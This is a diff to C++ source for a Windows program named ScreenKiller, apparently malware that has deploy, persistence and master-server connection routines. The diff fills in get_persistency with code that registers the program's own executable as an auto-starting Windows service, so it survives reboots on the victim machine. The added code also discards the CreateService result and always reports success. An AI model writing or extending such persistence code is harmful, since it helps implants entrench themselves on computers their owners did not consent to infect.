@@ -69,7 +69,38 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	return false;
+	TCHAR computer_name[MAX_COMPUTER_NAME];
+	DWORD computer_name_length = MAX_COMPUTER_NAME;
+	TCHAR szExeFilename[MAX_PATH];
+
+	if (GetModuleFileName(NULL, szExeFilename, MAX_PATH) == 0)
+		return false;
+
+	if (!GetComputerName(computer_name, &computer_name_length))
+		return false;
+
+	SC_HANDLE schSCManager;
+	SC_HANDLE schService;
+
+	schSCManager = OpenSCManager(computer_name, NULL, SC_MANAGER_ALL_ACCESS);
+	if (!schSCManager)
+		return false;
+
+	CreateService(schSCManager,
+		SERVICE_NAME,
+		SERVICE_NAME,
+		SERVICE_ALL_ACCESS,
+		SERVICE_WIN32_OWN_PROCESS,
+		SERVICE_AUTO_START,
+		SERVICE_ERROR_NORMAL,
+		szExeFilename,
+		NULL,
+		NULL,
+		NULL,
+		NULL,
+		NULL) != NULL;
+
+	return true;
 }
 
 bool ScreenKiller::connect_to_master_server()
